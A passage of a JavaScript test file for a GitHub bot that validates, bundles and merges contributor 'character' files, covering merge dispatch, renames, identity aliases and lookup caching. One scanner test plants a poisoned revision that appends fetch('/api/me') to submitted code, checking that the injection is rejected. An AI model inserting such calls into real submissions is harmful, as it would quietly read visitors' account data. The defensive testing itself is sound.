test("Actions-token merges explicitly dispatch the post-merge build and recover without duplicate dispatches", async () => {
  const bot = "github-actions[bot]", repo = "example/land", comments = [], calls = [];
  const pr = { number: 3, merged_at: "2026-10-05T00:00:00Z", merged_by: { login: bot }, merge_commit_sha: "a".repeat(40),
    user: { login: bot }, head: { ref: "automation/characters-daily-abc", repo: { full_name: repo } }, base: { repo: { full_name: repo } } };
  const gh = { repo, list: async () => comments, api: async (path, method, data) => {
    calls.push({ path, method, data });
    if (path === "issues/3/comments") comments.push({ user: { login: bot }, body: data.body });
  } };
  const coordinator = createCoordinator(gh, bot);
  await coordinator.deployMerged({ ...pr, merged_by: { login: "w-s-bitcoin" } });
  assert.equal(calls.length, 0); // Human merges already produce a push workflow.
  await coordinator.deployMerged(pr);
  await coordinator.deployMerged(pr);
  const dispatches = calls.filter((call) => call.path.endsWith("/dispatches"));
  assert.equal(dispatches.length, 1);
  assert.deepEqual(dispatches[0].data, { ref: "rock", inputs: { merge_sha: pr.merge_commit_sha } });
  await createCoordinator(gh, "private-app[bot]").deployMerged({ ...pr, user: { login: "private-app[bot]" }, merged_by: { login: "private-app[bot]" } });
  assert.equal(calls.filter((call) => call.path.endsWith("/dispatches")).length, 1); // App merges already emit push events.
});

test("an otherwise validated overdue daily bundle never calls merge when conflicted or its mergeability is unknown", async () => {
  const bot = "github-actions[bot]", repo = "example/land", rock = "a".repeat(40), sourceHead = "b".repeat(40), head = "c".repeat(40);
  const path = "src/characters/owner.js", source = safeCharacterSource({ handle: "owner", joined: 1, lastCommit: 2 });
  const entry = { pr: 7, head: sourceHead, author: "owner", path, base: null, hash: digest(source), lane: "daily" };
  const state = { version: 1, lane: "daily", openedOn: "2026-10-03", entries: [entry] };
  const bundle = { number: 8, user: { login: bot }, mergeable: false, mergeable_state: "dirty",
    head: { sha: head, ref: "automation/characters-daily-round", repo: { full_name: repo } }, base: { ref: "rock", repo: { full_name: repo } } };
  let merges = 0;
  const gh = { repo, tree: async () => new Map(),
    list: async (url) => url.endsWith("/reviews") ? [] : [bundle],
    file: async (sha, filename) => sha === rock ? null : filename === manifestPath("daily") ? { source: JSON.stringify(state) } : { source, sha },
    api: async (url, method) => {
      if (url === "git/ref/heads/rock") return { object: { sha: rock } };
      if (url === "pulls/8") return bundle;
      if (url === "pulls/7") return { number: 7, state: "closed", user: { login: "owner" }, base: { ref: "rock" }, head: { sha: sourceHead } };
      if (url.startsWith("collaborators/")) return { permission: "read" };
      if (url.startsWith("statuses/")) return {};
      if (url === `commits/${head}`) return { author: { login: bot }, commit: { verification: { verified: true } } };
      if (url === `commits/${sourceHead}?per_page=100`) return { author: { login: "owner" }, parents: [{ sha: rock }], files: [{ filename: path, status: "added" }] };
      if (url.startsWith("compare/")) return { merge_base_commit: { sha: rock }, total_commits: 1, commits: [{ sha: sourceHead }], behind_by: 0,
        files: [{ filename: path, status: "added" }, ...(url.endsWith(head) ? [{ filename: manifestPath("daily"), status: "added" }] : [])] };
      if (url.endsWith("/merge") && method === "PUT") { merges++; return { merged: true }; }
      throw new Error(`Unexpected API call ${url}`);
    }
  };
  const coordinator = createCoordinator(gh, bot, () => new Date(NOW));
  await assert.rejects(coordinator.mergeDaily(), /not mergeable/);
  bundle.mergeable = null; bundle.mergeable_state = "unknown";
  await assert.rejects(coordinator.mergeDaily(), /not mergeable/);
  assert.equal(merges, 0);
});

test("the scanner checks earlier character revisions and extracts only character files from mixed PRs", async () => {
  const path = "src/characters/owner.js", head = "a".repeat(40), old = "b".repeat(40), rock = "c".repeat(40), base = "d".repeat(40);
  const source = characterSource({ handle: "owner", joined: 1, lastCommit: 2 });
  let poisoned = true, author = "owner", current = null;
  const gh = {
    list: async () => [{ sha: old }, { sha: head }],
    api: async (url) => {
      if (url === "pulls/7") return { number: 7, user: { login: "owner" }, base: { ref: "rock" }, head: { sha: head } };
      if (url.startsWith("collaborators/")) return { permission: "read" };
      if (url.startsWith("compare/")) return { merge_base_commit: { sha: base }, total_commits: 2, files: [{ filename: path, status: "added" }, { filename: "README.md", status: "modified" }] };
      if (url.startsWith("commits/")) return { author: { login: author }, parents: [{ sha: base }], files: [{ filename: path, status: "added" }] };
      throw new Error("Unexpected API call");
    },
    file: async (ref) => ref === base ? null : ref === rock ? current : { source: ref === old && poisoned ? source + 'fetch("/api/me");' : source, sha: ref }
  };
  await assert.rejects(inspectSubmission(gh, { pr: 7, head }, rock), CharacterRejection);
  poisoned = false;
  const accepted = await inspectSubmission(gh, { pr: 7, head }, rock);
  assert.equal(accepted.mixed, true);
  assert.deepEqual(accepted.entries.map((entry) => entry.path), [path]);
  assert.equal(accepted.entries[0].lane, "daily");
  current = { source: characterSource({ handle: "owner", joined: 1, lastCommit: 3 }), sha: "e".repeat(40) };
  await assert.rejects(inspectSubmission(gh, { pr: 7, head }, rock), /Character changed on rock/);
  current = null;
  author = "attacker";
  await assert.rejects(inspectSubmission(gh, { pr: 7, head }, rock), CharacterRejection);
});

const renameBase = `(() => {
  "use strict";
  const BL = window.BL;
  BL.characters.add({
    handle: "cave-name",
    github: "owner",
    joined: 1,
    lastCommit: 2,
    dress: { crown(k, v) { v.set(0, 0, 0, k.P.black); } }
  });
})();
`;
const renameSource = renameBase.replace('    handle: "cave-name",\n', '    handle: "cave-name",\n    display: "owner",\n');

test("independent GitHub display renames preserve every non-display byte and literal identity", () => {
  assert.equal(isGitHubDisplayRename(renameBase, renameSource), true);
  assert.equal(isGitHubDisplayRename(renameSource.replace('display: "owner"', 'display: "Old Name"'), renameSource), true);
  for (const source of [renameBase, renameSource + "\n", renameSource.replace('github: "owner"', 'github: "other"'),
    renameSource.replace('handle: "cave-name"', 'handle: "other"'), renameSource.replace('lastCommit: 2', 'lastCommit: 3'),
    renameSource.replace('k.P.black', 'k.P.white'), renameSource.replace('display: "owner"', 'display: "someone-else"'),
    renameSource.replace('display: "owner"', 'display: ("owner")'), renameSource.replace('display: "owner"', 'display: "owner", display: "owner"'),
    renameSource.replace('    display:', '  display:'), renameSource.replace('display: "owner"', 'display: `owner`'),
    renameSource.replace('display: "owner"', 'display: "ow\\ner"'), renameSource.replace('display: "owner"', 'display: call()'),
    renameSource.replace('dress:', '/* BL.characters.add({ */ dress:')]) assert.equal(isGitHubDisplayRename(renameBase, source), false);
  assert.equal(isGitHubDisplayRename(renameSource, renameBase), false);
  assert.equal(isGitHubDisplayRename(null, renameSource), false);
  assert.equal(isGitHubDisplayRename(renameBase.replace('    github: "owner",\n', ''), renameSource.replace('    github: "owner",\n', '').replace('display: "owner"', 'display: "cave-name"')), true);
});

test("rename intake requires immutable operator authority and cosmetic-only history", async () => {
  const rock = "a".repeat(40), head = "b".repeat(40), old = "c".repeat(40), path = "src/characters/cave-name.js";
  let user = { ...OPERATORS[0], type: "User" }, permission = "admin", earlier = false;
  const gh = {
    list: async () => [...(earlier ? [{ sha: old }] : []), { sha: head }],
    api: async (url) => {
      if (url === "pulls/7") return { number: 7, user, base: { ref: "rock" }, head: { sha: head } };
      if (url.startsWith("collaborators/")) return { permission };
      if (url.startsWith("compare/")) return { merge_base_commit: { sha: rock }, total_commits: earlier ? 2 : 1, files: [{ filename: path, status: "modified" }] };
      if (url.startsWith("commits/")) return { author: user, parents: [{ sha: earlier && url.includes(head) ? old : rock }], files: [{ filename: path, status: "modified" }] };
      throw new Error(`Unexpected request ${url}`);
    },
    file: async (ref) => ({ sha: ref, source: ref === rock ? renameBase : ref === old ? renameBase.replace('lastCommit: 2', 'lastCommit: 3') : renameSource })
  };
  const lane = async () => (await inspectSubmission(gh, { pr: 7, head }, rock)).entries[0].lane;
  assert.equal(await lane(), "rename");
  user.id = 1; assert.equal(await lane(), "manual");
  user = { ...OPERATORS[0], type: "Bot" }; assert.equal(await lane(), "manual");
  user = { ...OPERATORS[0], type: "User" }; earlier = true; assert.equal(await lane(), "manual");
  earlier = false; user = { login: "owner", id: 42, type: "User" }; permission = "read";
  assert.equal(await lane(), "manual");
  user = { ...OPERATORS[0], type: "User" };
  await assert.rejects(lane, /Only the GitHub owner/);
});

test("rename migration preserves held custom submissions, revalidates provenance and requires fresh approval", async () => {
  const repo = "example/land", bot = "private-app[bot]", rock = "a".repeat(40), sourceHead = "b".repeat(40);
  const user = { ...OPERATORS[0], type: "User" }, path = "src/characters/cave-name.js", heldPath = "src/characters/held.js";
  const heldSource = safeCharacterSource({ handle: "held", joined: 1, lastCommit: 2 });
  const held = { pr: 9, head: "c".repeat(40), author: "held", path: heldPath, base: null, hash: digest(heldSource), lane: "manual" };
  const old = { pr: 6, head: "d".repeat(40), author: user.login, path, base: rock, hash: digest(renameSource), lane: "manual" };
  const files = new Map([[rock, new Map([[path, { source: renameBase, sha: rock }]])], [sourceHead, new Map([[path, { source: renameSource, sha: sourceHead }]])]]);
  const prs = LANES.map((lane, i) => {
    const head = String(i + 1).repeat(40), state = { version: 1, lane, openedOn: "2026-10-04", entries: lane === "manual" ? [held, old] : [] };
    files.set(head, new Map([[manifestPath(lane), { source: JSON.stringify(state) }],
      ...(lane === "manual" ? [[path, { source: renameSource }], [heldPath, { source: heldSource }]] : [])]));
    return { number: i + 1, state: "open", user: { login: bot }, head: { sha: head, ref: `automation/characters-${lane}-round`, repo: { full_name: repo } }, base: { ref: "rock", repo: { full_name: repo } } };
  });
  const sourcePr = { number: 7, state: "open", user, head: { sha: sourceHead, ref: "rename", repo: { full_name: repo } }, base: { ref: "rock", repo: { full_name: repo } } };
  const writes = [], statuses = new Map(); let sequence = 10, reviews = [];
  const gh = { repo,
    tree: async () => files.get(rock),
    file: async (sha, name) => files.get(sha)?.get(name) || null,
    list: async (url) => url.endsWith("/commits") ? [{ sha: sourceHead }] : url.endsWith("/reviews") ? reviews : url.endsWith("/comments") ? [] : prs,
    commit: async (branch, expected, additions, deletions) => {
      const pr = prs.find(row => row.head.ref === branch); assert.equal(pr.head.sha, expected);
      assert.deepEqual(deletions, []); const next = new Map(files.get(expected));
      for (const file of additions) next.set(file.path, { source: file.source });
      const sha = String(sequence++).padStart(40, "0"); files.set(sha, next); pr.head.sha = sha;
      writes.push({ branch, additions }); return sha;
    },
    api: async (url, method, data) => {
      if (url === "git/ref/heads/rock") return { object: { sha: rock } };
      if (url.startsWith("collaborators/")) return { permission: "admin" };
      if (url.startsWith("statuses/")) { statuses.set(url + ":" + data.context, data.state); return {}; }
      if (url.endsWith("/comments")) return {};
      if (/^pulls\/\d+$/.test(url)) { const pr = Number(url.split("/")[1]) === 7 ? sourcePr : prs.find(row => row.number === Number(url.split("/")[1])); if (method === "PATCH") Object.assign(pr, data); return pr; }
      if (url === `commits/${sourceHead}?per_page=100`) return { author: user, parents: [{ sha: rock }], files: [{ filename: path, status: "modified" }] };
      if (url.startsWith("commits/")) return { author: { login: bot }, commit: { verification: { verified: true } } };
      if (url.startsWith("compare/")) {
        const sha = url.split("...")[1];
        return { behind_by: 0, merge_base_commit: { sha: rock }, total_commits: 1, commits: [{ sha: sourceHead }],
          files: [...files.get(sha)].filter(([name, file]) => file.source !== files.get(rock).get(name)?.source)
            .map(([filename]) => ({ filename, status: filename === path ? "modified" : "added" })) };
      }
      throw new Error(`Unexpected request ${url}`);
    }
  };
  const coordinator = createCoordinator(gh, bot, () => new Date(NOW));
  const manual = prs[1], rename = prs[2], queued = files.get(manual.head.sha).get(path);
  queued.source += "\n";
  await assert.rejects(coordinator.intake({ pr: 7, head: sourceHead }), /differs from its verified source/);
  assert.equal(writes.length, 0);
  queued.source = renameSource;
  await coordinator.intake({ pr: 7, head: sourceHead });
  const manualFiles = files.get(manual.head.sha), renameFiles = files.get(rename.head.sha);
  assert.deepEqual(JSON.parse(manualFiles.get(manifestPath("manual")).source).entries, [held]);
  assert.equal(manualFiles.get(heldPath).source, heldSource);
  assert.equal(manualFiles.get(path).source, renameBase);
  assert.equal(renameFiles.get(path).source, renameSource);
  assert.equal(JSON.parse(renameFiles.get(manifestPath("rename")).source).entries[0].head, sourceHead);
  assert.equal(sourcePr.state, "closed");
  const gate = () => statuses.get(`statuses/${rename.head.sha}:Character bundle safety`);
  assert.equal(gate(), "pending");
  reviews = [{ user, state: "APPROVED", commit_id: "old" }];
  await coordinator.intake({ pr: rename.number }); assert.equal(gate(), "pending");
  reviews[0].commit_id = rename.head.sha;
  await coordinator.intake({ pr: rename.number }); assert.equal(gate(), "success");
  reviews[0].state = "CHANGES_REQUESTED";
  // The held submission's source is deliberately unavailable in this fixture.
  // Report its failed validation while still refreshing the rename gate.
  await assert.rejects(coordinator.refreshReviews()); assert.equal(gate(), "pending");
  assert.equal(writes.length, 2);
});

test("queued custom identities reserve defaults without executing source and require trusted provenance", async () => {
  const repo = "example/land", bot = "private-app[bot]", head = "a".repeat(40), path = "src/characters/cave-name.js";
  const source = 'throw new Error("Never execute me"); BL.characters.add({ handle: "cave-name", github: "owner", dress: { eyes(k, v) {} } });';
  const entry = { pr: 7, head: "b".repeat(40), author: "owner", path, base: null, hash: digest(source), lane: "manual" };
  const state = { version: 1, lane: "manual", openedOn: "2026-10-04", entries: [entry] };
  const pr = { number: 8, state: "open", user: { login: bot }, head: { sha: head, ref: "automation/characters-manual-round", repo: { full_name: repo } },
    base: { ref: "rock", repo: { full_name: repo } } };
  let verified = true, savedSource = source;
  const gh = { repo, list: async () => [pr, { ...pr, user: { login: "other" } }],
    api: async (url) => {
      if (url === "pulls/8") return pr;
      if (url === `commits/${head}`) return { author: { login: bot }, commit: { verification: { verified } } };
      throw new Error(`Unexpected API call ${url}`);
    },
    file: async (sha, filename) => {
      assert.equal(sha, head);
      if (filename === manifestPath("manual")) return { source: JSON.stringify(state) };
      if (filename === path) return { source: savedSource };
      throw new Error(`Unexpected queued file ${filename}`);
    }
  };
  assert.deepEqual(await queuedCharacters(gh, bot), [{ path, base: null, character: { handle: "cave-name", github: "owner" } }]);
  verified = false;
  await assert.rejects(queuedCharacters(gh, bot));
  verified = true; savedSource += "\n// changed after scanning\n";
  await assert.rejects(queuedCharacters(gh, bot));
});

test("empty placeholders migrate to the scoped App without duplication, never merge empty, and reopen after merging", async () => {
  let bot = BOT, unexpected = false;
  const repo = "example/land", refs = new Map([["rock", "1".repeat(40)]]), files = new Map(), authors = new Map(), prs = [];
  let sequence = 2, mergeCalls = 0;
  const gh = {
    repo,
    list: async (path) => path.includes("state=closed") ? [] : prs.filter((pr) => pr.state === "open"),
    tree: async () => new Map(),
    file: async (sha, path) => files.get(`${sha}:${path}`) || null,
    commit: async (branch, expected, additions) => {
      assert.equal(refs.get(branch), expected);
      const sha = String(sequence++).padStart(40, "0"); refs.set(branch, sha);
      authors.set(sha, bot);
      for (const file of additions) files.set(`${sha}:${file.path}`, { source: file.source, sha });
      return sha;
    },
    api: async (path, method, data) => {
      if (path.startsWith("git/ref/heads/")) { const sha = refs.get(decodeURIComponent(path.slice(14))); return sha ? { object: { sha } } : null; }
      if (path === "git/refs") { refs.set(data.ref.slice(11), data.sha); return { object: { sha: data.sha } }; }
      if (path === "pulls" && method === "POST") {
        const pr = { number: prs.length + 1, state: "open", user: { login: bot }, head: { ref: data.head, sha: refs.get(data.head), repo: { full_name: repo } }, base: { ref: "rock", repo: { full_name: repo } } };
        prs.push(pr); return pr;
      }
      if (/^pulls\/\d+$/.test(path)) {
        const pr = prs.find((pr) => pr.number === Number(path.split("/")[1]));
        pr.head.sha = refs.get(pr.head.ref); return pr;
      }
      if (path.startsWith("commits/")) return { author: { login: authors.get(path.slice(8)) }, commit: { verification: { verified: true } } };
      if (path.startsWith("compare/")) {
        const sha = path.split("...")[1], lane = files.has(`${sha}:${manifestPath("daily")}`) ? "daily" : "manual";
        return { files: [{ filename: manifestPath(lane), status: "added" }, ...(unexpected ? [{ filename: "unsafe.js", status: "added" }] : [])] };
      }
      if (path.endsWith("/merge")) { mergeCalls++; throw new Error("Empty bundle must never merge"); }
      throw new Error(`Unexpected API call ${path}`);
    }
  };
  let coordinator = createCoordinator(gh, bot, () => new Date(NOW));
  const daily = await coordinator.ensure("daily"), manual = await coordinator.ensure("manual");
  assert.notEqual(daily.number, manual.number);
  assert.equal((await coordinator.ensure("daily")).number, daily.number);
  bot = "private-app[bot]";
  coordinator = createCoordinator(gh, bot, () => new Date(NOW));
  unexpected = true;
  await assert.rejects(coordinator.ensure("daily"), /unexpected files/);
  unexpected = false;
  for (const lane of ["daily", "manual"]) {
    const adopted = await coordinator.ensure(lane);
    assert.equal(authors.get(adopted.head.sha), bot);
  }
  assert.equal(prs.length, 2);
  await coordinator.mergeDaily();
  assert.equal(mergeCalls, 0);
  manual.state = "closed"; refs.set("rock", "f".repeat(40));
  const nextManual = await coordinator.ensure("manual");
  assert.notEqual(nextManual.number, manual.number);
  assert.equal((await coordinator.ensure("daily")).number, daily.number);
});

test("confirmed aliases roll up across stats without increasing event totals or granting the alias an identity", () => {
  const normalize = globalThis.BL.contributorIdentities.normalizeStats;
  const a = "email:bdb4923572c8ac13", b = "email:56537ddd43347582";
  const raw = snapshot(person("MrHodlX", { counts: { commits: 302 }, weekly: [{ week: "2026-W35", commits: 10 }] }),
    person(a, { counts: { commits: 4 }, weekly: [{ week: "2026-W35", commits: 4 }], type: "Bot" }),
    person(b, { counts: { commits: 1 }, weekly: [{ week: "2026-W34", commits: 1 }], first_seen_at: "2026-08-25T00:00:00Z", last_seen_at: "2026-10-04T11:30:00Z" }),
    person("claude", { counts: { commits: 14 } }));
  raw.totals = { contributors: 4, commits: 321 };
  raw.leaderboards = { commits: raw.contributors.map((row) => ({ login: row.login, count: row.counts.commits })) };
  raw.repos = [{ name: "entropylab", totals: { contributors: 2, commits: 10 },
    contributors: [{ login: "MrHodlX", last_seen_at: "2026-10-04T10:00:00Z" }, { login: a, last_seen_at: "2026-10-04T11:00:00Z" }],
    leaderboards: { commits: [{ login: "MrHodlX", count: 6 }, { login: a, count: 4 }] }, weekly: [{ week: "2026-W35", commits: 10 }] }];
  raw.recent = [{ login: a, repo: "entropylab", type: "commit", occurred_at: "2026-10-04T11:00:00Z" },
    { login: a, repo: "entropylab", type: "commit", occurred_at: "2026-10-04T11:00:00Z" }];
  const before = JSON.stringify(raw), result = normalize(raw, NOW);
  const owner = result.contributors.find((row) => row.login === "MrHodlX");
  assert.equal(owner.counts.commits, 307);
  assert.deepEqual(owner.attributed_logins, [b, a].sort());
  assert.equal(owner.first_seen_at, "2026-08-25T00:00:00.000Z");
  assert.equal(owner.last_seen_at, "2026-10-04T11:30:00.000Z");
  assert.deepEqual(owner.weekly.map((row) => row.commits), [1, 14]);
  assert.equal(owner.type, undefined);
  assert.equal(result.totals.commits, 321);
  assert.equal(result.totals.contributors, 2);
  assert.equal(result.leaderboards.commits[0].count, 307);
  assert.equal(result.repos[0].leaderboards.commits[0].count, 10);
  assert.equal(result.repos[0].contributors.length, 1);
  assert.equal(result.repos[0].contributors[0].last_seen_at, "2026-10-04T11:00:00.000Z");
  assert.deepEqual(result.repos[0].weekly, raw.repos[0].weekly);
  assert.equal(result.recent.length, 2);
  assert.ok(result.recent.every((row) => row.login === "MrHodlX"));
  assert.equal(result.contributors.find((row) => row.login === "claude").counts.commits, 14);
  assert.equal(normalize(result, NOW), result);
  assert.equal(JSON.stringify(raw), before);
  assert.deepEqual(contributorRows(raw, NOW).map((row) => row.handle), ["mrhodlx"]);
  const alone = normalize(snapshot(person(a)), NOW);
  assert.equal(alone.contributors[0].login, "MrHodlX");
  const harry = normalize(snapshot(person("Harry"), person("hotpixelgroup")), NOW);
  assert.deepEqual(harry.contributors.map((row) => row.login), ["hotpixelgroup"]);
  assert.equal(harry.contributors[0].counts.commits, 2);
  assert.deepEqual(contributorRows(harry, NOW).map((row) => row.handle), ["hotpixelgroup"]);
});

test("onboarding rejects bot aliases, unresolved identities, malformed dates and stale snapshots", () => {
  const rows = contributorRows(snapshot(person("New-Ooga"), person("NEW-OOGA"), person("robotics-human"),
    person("claude"), person("CODEX"), person("dependabot[bot]"), person("email:123"), person("../x"),
    person("machine", { type: "Bot" }), person("automation", { is_bot: true }), person("bad--login"),
    person("comments-only", { counts: { commits: 0, comments: 50, prs: 3, reviews: 2 } }),
    person("unknown-count", { counts: null }), person("string-count", { counts: { commits: "1" } }),
    person("future", { last_seen_at: "2027-01-01T00:00:00Z" }), person("no-date", { first_seen_at: null })), NOW);
  assert.deepEqual(rows.map((row) => row.handle), ["new-ooga", "robotics-human"]);
  assert.equal(rows[0].joined, Date.parse("2026-09-01T00:00:00Z") / 1000);
  assert.throws(() => contributorRows(snapshot(person("new-ooga")), NOW + 86400001));
  assert.throws(() => contributorRows({ ...snapshot(), meta: { org: "elsewhere", schema_version: 3 } }, NOW));
});

test("queued and just-merged custom characters reserve their handles and GitHub aliases against defaults", () => {
  const existing = [{ handle: "cave-name", github: "GitHub-Owner", look: { bald: true } }, { handle: "Another" }];
  const pending = [{ path: "src/characters/queued-alias.js", base: null, character: { handle: "Queued-Alias", github: "Waiting-Owner" } }];
  const rows = contributorRows(snapshot(person("github-owner"), person("CAVE-NAME"), person("another"), person("queued-alias"), person("waiting-owner"), person("new-ooga")), NOW);
  const missing = missingCharacters(rows, existing, pending);
  assert.deepEqual(missing.map((row) => row.handle), ["new-ooga"]);
  assert.equal(missingCharacters(rows, [...existing, ...missing], pending).length, 0);
  const collected = [];
  runInNewContext(characterSource(missing[0]), { window: { BL: { characters: { add: (row) => collected.push(row) } } } });
  assert.equal(collected[0].handle, "new-ooga");
  assert.equal(collected[0].joined, missing[0].joined);
  assert.equal(declaredIdentity(characterSource(missing[0])).handle, "new-ooga");
  assert.deepEqual(existing[0].look, { bald: true });
  const alias = { handle: "harry", joined: 1, lastCommit: 2 }, owner = { handle: "hotpixelgroup", joined: 1, lastCommit: 2 };
  const source = characterSource(alias), sourceFor = (file) => file === "harry.js" ? source : null;
  assert.deepEqual(retiredCharacters([alias, owner], sourceFor), [{ file: "harry.js", source }]);
  assert.deepEqual(retiredCharacters([alias], sourceFor), []);
  assert.deepEqual(retiredCharacters([alias, owner], () => source + "// Custom profile\n"), []);
});

test("queued additions retire only exact untouched generated defaults for their reserved identities", () => {
  const source = characterSource({ handle: "new-ooga", joined: 1, lastCommit: 2 });
  const entry = { path: "src/characters/new-ooga.js", base: null, character: { handle: "NEW-OOGA", github: "New-Ooga" } };
  const sourceFor = (file) => file === "new-ooga.js" ? source : null;
  assert.deepEqual(queuedDefaults([entry], sourceFor), [{ file: "new-ooga.js", source }]);
  for (const other of [
    { ...entry, base: "a".repeat(40) },
    { ...entry, character: { handle: "another", github: "another-owner" } }
  ]) assert.deepEqual(queuedDefaults([other], sourceFor), []);
  // Intake can reserve an alias after a build generated its owner's default.
  const alias = { ...entry, path: "src/characters/cave-name.js", character: { handle: "cave-name", github: "new-ooga" } };
  assert.deepEqual(queuedDefaults([alias, entry], sourceFor), [{ file: "new-ooga.js", source }]);
  assert.deepEqual(queuedDefaults([{ ...alias, base: "a".repeat(40) }], sourceFor), []);
  assert.deepEqual(queuedDefaults([entry], (file) => file === "new-ooga.js" ? characterSource({ handle: "another", joined: 1, lastCommit: 2 }) : null), []);
  for (const custom of [null, "not a character", source + "// Custom profile\n",
    source.replace("lastCommit: 2", 'lastCommit: 2, look: { skin: "#123456" }')]) {
    assert.deepEqual(queuedDefaults([entry], () => custom), []);
  }
});

test("a single aliased profile gains github; explicit mappings and ambiguous batches are preserved", () => {
  const row = (file, handle, github) => ({ file, character: { handle, ...(github ? { github } : {}) } });
  assert.equal(identityAdvice([row("cave-name.js", "cave-name")], ["src/characters/cave-name.js"], "real-owner")[0].github, "real-owner");
  assert.equal(identityAdvice([row("Real-Owner.js", "Real-Owner")], ["src/characters/Real-Owner.js"], "real-owner")[0].mismatch, false);
  const explicit = identityAdvice([row("cave-name.js", "cave-name", "real-owner")], ["src/characters/cave-name.js"], "maintainer")[0];
  assert.equal(explicit.github, null);
  assert.equal(explicit.login, "real-owner");
  const batch = [row("one.js", "one"), row("two.js", "two")];
  assert.ok(identityAdvice(batch, batch.map((r) => `src/characters/${r.file}`), "maintainer").every((r) => r.missing));
  const occupied = [row("alias.js", "alias"), row("owner.js", "owner", "real-owner")];
  assert.equal(identityAdvice(occupied, ["src/characters/alias.js"], "real-owner")[0].missing, true);
  const maintained = identityAdvice([row("new-owner.js", "new-owner")], ["src/characters/new-owner.js"], "maintainer", true)[0];
  assert.equal(maintained.login, "new-owner");
  assert.equal(maintained.github, null);
  assert.equal(maintained.missing, false);
});

test("identity declarations are read without executing PR code and owners cannot impersonate or transfer profiles", () => {
  const source = 'throw new Error("Never execute me"); BL.characters.add({ handle: "alias", github: "owner", dress: { eyes(k, v) { return { a: 1 }; } } });';
  const identity = declaredIdentity(source);
  assert.deepEqual(identity, { handle: "alias", github: "owner" });
  assert.equal(mayAuthorIdentity("owner", identity, null, false), true);
  assert.equal(mayAuthorIdentity("attacker", identity, null, false), false);
  assert.equal(mayAuthorIdentity("maintainer", identity, null, true), true);
  assert.equal(mayAuthorIdentity("attacker", { handle: "alias", github: "attacker" }, identity, false), false);
  assert.equal(mayAuthorIdentity("owner", { handle: "new-alias", github: "owner" }, identity, false), true);
  for (const body of ['handle: "one", github: "two", github: "one"', 'handle: login', 'handle: "one", ...other', 'handle: "one", [key]: "two"', 'get handle() { return "one"; }']) {
    assert.throws(() => declaredIdentity(`BL.characters.add({ ${body} });`));
  }
  // The established custom profiles remain legal under the declarative reader.
  for (const name of readdirSync(new URL("../../src/characters/", import.meta.url)).filter((name) => name.endsWith(".js"))) {
    assert.ok(declaredIdentity(readFileSync(new URL(`../../src/characters/${name}`, import.meta.url), "utf8")).handle);
  }
});

test("signed-in lookups coalesce requests and bound last-good identities by snapshot age through outages", async () => {
  let now = NOW, calls = 0, fail = false, present = true;
  const lookup = createContributorLookup(async () => {
    calls++;
    if (fail) throw new Error("offline");
    return Response.json({ ...snapshot(...present ? [person("new-ooga")] : []), meta: { ...snapshot().meta, generated_at: new Date(now).toISOString() } });
  }, () => now);
  const results = await Promise.all([lookup("new-ooga"), lookup("NEW-OOGA"), lookup("visitor")]);
  assert.equal(calls, 1);
  assert.equal(results[0].handle, "new-ooga");
  assert.equal(results[1].handle, "new-ooga");
  assert.equal(results[2], null);
  now += 60001; fail = true;
  assert.equal((await lookup("new-ooga")).handle, "new-ooga");
  assert.equal(await lookup("visitor"), null);
  assert.equal(calls, 2);
  now = NOW + 86400000;
  assert.equal(await lookup("new-ooga"), null, "last-good rows cannot outlive the original snapshot");
  now = NOW + 86415001; fail = false;
  assert.equal((await lookup("new-ooga")).handle, "new-ooga");
  now += 60001; present = false;
  assert.equal(await lookup("new-ooga"), null, "a successful refresh removes an absent identity immediately");
  now += 60001; fail = true;
  assert.equal(await lookup("new-ooga"), null, "an outage cannot resurrect an identity removed by a successful refresh");
});

test("a refresh that never settles, its request cancelled, keeps nobody waiting and is replaced", async () => {
  let now = NOW, calls = 0, hang = true;
  const lookup = createContributorLookup(() => {
    calls++;
    if (hang) return new Promise(() => {});
    return Promise.resolve(Response.json({ ...snapshot(person("new-ooga")), meta: { ...snapshot().meta, generated_at: new Date(now).toISOString() } }));
  }, () => now, 5);
  assert.equal(await lookup("new-ooga"), null, "the hung refresh answers nobody and holds nobody");
  now += 10; hang = false;
  assert.equal((await lookup("new-ooga")).handle, "new-ooga", "the next look starts a new refresh");
  assert.equal(calls, 2);
});

test("sign-in belongs to the bundled GitHub owner, never an account named after their alias", async () => {
  let requests = 0;
  const lookup = createOwnedCharacterLookup([{ handle: "Cave-Name", github_login: "real-owner",
    joined_at: "2026-09-01T00:00:00Z", last_commit_at: "2026-10-04T11:00:00Z" }], async () => {
    requests++;
    return { handle: "cave-name", joined: 1, lastCommit: 2 };
  });
  assert.deepEqual(await lookup("REAL-OWNER"), { handle: "Cave-Name", joined: 1788220800, lastCommit: 1791111600 });
  assert.equal(await lookup("cave-name"), null, "a valid dynamic row cannot shadow a bundled alias");
  assert.equal(requests, 0, "bundled ownership and occupied aliases need no Oogatron request");
});

test("only verified commit contributors gain temporary access; outages retain only recent verified rows and preserve bundled owners", async () => {
  let now = NOW, fail = false, calls = 0;
  const dynamic = createContributorLookup(async () => {
    calls++;
    if (fail) throw new Error("offline");
    return Response.json(snapshot(person("new-ooga"), person("issue-author", { counts: { commits: 0, issues: 2, prs: 1 } })));
  }, () => now);
  const lookup = createOwnedCharacterLookup([{ handle: "Cave-Name", github_login: "real-owner",
    joined_at: "2026-09-01T00:00:00Z", last_commit_at: "2026-10-04T11:00:00Z" }], dynamic);
  assert.equal((await lookup("new-ooga")).handle, "new-ooga");
  assert.equal(await lookup("issue-author"), null);
  assert.equal(await lookup("visitor"), null);
  fail = true; now += 60001;
  assert.equal((await lookup("real-owner")).handle, "Cave-Name");
  assert.equal(calls, 1, "bundled owner never refreshes dynamic data");
  assert.equal((await lookup("new-ooga")).handle, "new-ooga");
  assert.equal(await lookup("visitor"), null);
  now = NOW + 86400000;
  assert.equal(await lookup("new-ooga"), null);
  assert.equal((await lookup("REAL-OWNER")).handle, "Cave-Name");
  assert.equal(calls, 3);
});

test("the browser accepts one matching temporary identity without reordering the bundled crew", () => {
  const context = { window: {}, URLSearchParams, location: { search: "" } };
  for (const name of ["math", "characters", "contributor-identities", "activity-repos"]) runInNewContext(readFileSync(new URL(`../../src/js/${name}.js`, import.meta.url), "utf8"), context);
  const BL = context.window.BL;
  BL.characters.add({ handle: "alias", github: "owner", joined: 1, lastCommit: 2 });
  runInNewContext(readFileSync(new URL("../../src/js/contributors.js", import.meta.url), "utf8"), context);
  const c = BL.contributors, row = { handle: "new-ooga", joined: 1, lastCommit: 2 };
  assert.equal(c.addTemporary(row, "somebody-else"), false);
  assert.equal(c.addTemporary({ ...row, handle: "owner" }, "owner"), false);
